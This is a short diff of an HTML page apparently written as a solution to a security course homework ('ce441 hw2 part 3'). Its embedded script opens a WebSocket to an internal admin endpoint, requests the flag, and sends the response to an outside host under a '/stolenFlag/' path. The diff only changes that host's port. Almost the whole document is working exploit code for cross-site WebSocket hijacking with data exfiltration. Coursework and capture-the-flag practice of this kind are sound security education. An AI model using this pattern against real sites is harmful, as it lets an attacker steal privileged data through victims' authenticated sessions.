@@ -6,7 +6,7 @@ this is ce441 hw2 part 3, v2
 const ws = new WebSocket(`ws://web:8080/admin/ws`);
 ws.onopen = () => ws.send("flag");
 ws.onmessage = (event) => {
-  const response = event.data;  fetch(`http://hw2p3.ckodser.ir/stolenFlag/${response}`);
+  const response = event.data;  fetch(`http://hw2p3.ckodser.ir:8043/stolenFlag/${response}`);
 };
   </script>
 </body></html>
